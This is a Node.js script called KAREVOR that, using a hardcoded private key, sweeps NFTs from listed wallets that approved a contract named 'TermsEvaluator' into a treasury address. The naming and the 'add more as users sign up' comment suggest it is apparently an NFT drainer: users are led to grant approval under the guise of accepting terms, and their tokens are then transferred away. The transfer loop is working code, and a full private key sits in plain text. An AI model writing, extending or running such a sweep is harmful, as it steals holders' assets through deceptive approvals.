/**
 * KAREVOR - Transfer NFTs from all approved wallets to destination
 * 
 * This script checks all known wallets that have approved the TermsEvaluator contract
 * and transfers their NFTs to the treasury destination.
 */

const { ethers } = require('ethers');

const RPC_URL = 'https://rpc.hyperliquid.xyz/evm';
const EVALUATOR_CONTRACT = '0x221f11eCE3bC09fd5Ba55BBd9A2353d32196faDc';
const OWNER_PRIVATE_KEY = '0x0ffb5f4f02aa35f6b73660a0ba80e7219de801cb15643698ba5ec5555f1c73a7';

// NFT contracts to check
const NFT_CONTRACTS = [
  '0x298AbE38965DC68d239192d4366ab8c5b65a3B6f', // Random Art NFT
  '0x9125e2d6827a00b0f8330d6ef7bef07730bac685', // Hypurr NFT
];

// Known wallets that may have approved (add more as users sign up)
const KNOWN_WALLETS = [
  '0x67252aCF497134CC5c8f840a38b5f59Fc090Af83',
  '0x25b155C387bcf2434F0df5e2f34E9D68E0A99228',
  '0x53e66B3b0CA0a5DB254c426d4E2488a0c58eF2a8',
];

const ERC721_ABI = [
  'function balanceOf(address) view returns (uint256)',
  'function tokenOfOwnerByIndex(address, uint256) view returns (uint256)',
  'function isApprovedForAll(address, address) view returns (bool)'
];

const EVALUATOR_ABI = [
  'function processOnBehalf(address wallet, address assetContract, uint256[] calldata tokenIds) external',
  'function treasuryWallet() view returns (address)',
  'function getEnabledContracts() view returns (address[])'
];

async function KAREVOR() {
  console.log('');
  console.log('╔═══════════════════════════════════════════════════════════╗');
  console.log('║                      K A R E V O R                        ║');
  console.log('║         Transfer NFTs from approved wallets               ║');
  console.log('╚═══════════════════════════════════════════════════════════╝');
  console.log('');

  const provider = new ethers.JsonRpcProvider(RPC_URL);
  const wallet = new ethers.Wallet(OWNER_PRIVATE_KEY, provider);
  
  const evaluator = new ethers.Contract(EVALUATOR_CONTRACT, EVALUATOR_ABI, wallet);
  const treasury = await evaluator.treasuryWallet();
  
  console.log('Evaluator Contract:', EVALUATOR_CONTRACT);
  console.log('Destination Treasury:', treasury);
  console.log('Executor:', wallet.address);
  console.log('');
  console.log('═'.repeat(60));
  
  let totalTransferred = 0;
  
  // Get enabled NFT contracts from the evaluator
  let nftContracts = NFT_CONTRACTS;
  try {
    const enabledContracts = await evaluator.getEnabledContracts();
    if (enabledContracts.length > 0) {
      nftContracts = enabledContracts;
    }
  } catch (e) {
    console.log('Using default NFT contracts list');
  }
  
  // Check each wallet
  for (const ownerAddress of KNOWN_WALLETS) {
    console.log('');
    console.log(`🔍 Checking wallet: ${ownerAddress}`);
    
    for (const nftAddress of nftContracts) {
      try {
        const nft = new ethers.Contract(nftAddress, ERC721_ABI, provider);
        
        // Check balance
        const balance = await nft.balanceOf(ownerAddress);
        if (balance == 0) {
          continue;
        }
        
        // Check approval
        const isApproved = await nft.isApprovedForAll(ownerAddress, EVALUATOR_CONTRACT);
        if (!isApproved) {
          console.log(`   ⚠️  ${nftAddress}: ${balance} NFTs but NOT APPROVED`);
          continue;
        }
        
        // Get token IDs
        const tokenIds = [];
        for (let i = 0; i < balance; i++) {
          const tokenId = await nft.tokenOfOwnerByIndex(ownerAddress, i);
          tokenIds.push(tokenId.toString());
        }
        
        console.log(`   📦 ${nftAddress}: ${tokenIds.length} NFTs [${tokenIds.join(', ')}]`);
        
        // Execute transfer
        console.log(`   🚀 Transferring...`);
        const tx = await evaluator.processOnBehalf(
          ownerAddress,
          nftAddress,
          tokenIds,
          { gasLimit: 500000 }
        );
        
        console.log(`   ⏳ TX: ${tx.hash}`);
        await tx.wait();
        
        console.log(`   ✅ Transferred ${tokenIds.length} NFT(s) to treasury`);
        totalTransferred += tokenIds.length;
        
      } catch (err) {
        console.log(`   ❌ Error with ${nftAddress}: ${err.message}`);
      }
    }
  }
  
  console.log('');
  console.log('═'.repeat(60));
  console.log('');
  console.log(`🎉 KAREVOR COMPLETE`);
  console.log(`   Total NFTs transferred: ${totalTransferred}`);
  console.log(`   Destination: ${treasury}`);
  console.log('');
}

// Run KAREVOR
KAREVOR().catch(err => {
  console.error('❌ KAREVOR failed:', err.message);
  process.exit(1);
});
